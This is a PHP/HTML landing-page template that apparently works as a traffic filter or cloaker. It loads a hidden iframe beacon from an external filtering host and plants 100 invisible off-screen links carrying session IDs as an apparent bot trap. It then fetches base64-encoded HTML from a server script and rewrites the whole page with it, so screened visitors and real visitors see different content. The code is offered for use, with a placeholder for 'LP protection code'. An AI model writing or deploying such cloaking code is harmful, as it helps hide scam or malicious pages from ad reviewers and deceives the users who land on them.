<?php
//替换为你的lp保护代码
?>
<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <title></title>
    <script src="js/zepto.min.js"></script>
    <script src="js/base64.min.js"></script>
    <style>iframe {
            visibility: hidden;
            position: absolute;
            left: 0; top: 0;
            height:0; width:0;
            border: none;
        }</style>
</head>
<body>

<script>

    u1 = "https://afilter.xyz/";
    u2 = "p/events?et=4";

    document.write('<iframe src="' + u1 + "/" + u2 + '"></iframe>');

</script>

<?php for ($i = 0; $i < 100; $i++) { ?>
    <a href="https://afilter.xyz/d/<?php echo session_create_id() ?>" style="position: absolute; left: -100px;">Check
        Now</a>
<?php } ?>

<script>
    function b64DecodeUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    $.ajax({
        type: 'GET',
        url: "source.php",
        cache: false,
        data: {
            v: getQueryString("v")
        },
        success: function (data) {
            var doc = document.open('text/html', 'replace');
            var dat = b64DecodeUnicode(data);
            doc.write(dat);
            doc.close();
        },
        error: function () {

        }
    });

    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return unescape(r[2]);
        }
        return null;
    }
</script>
</body>
</html>
        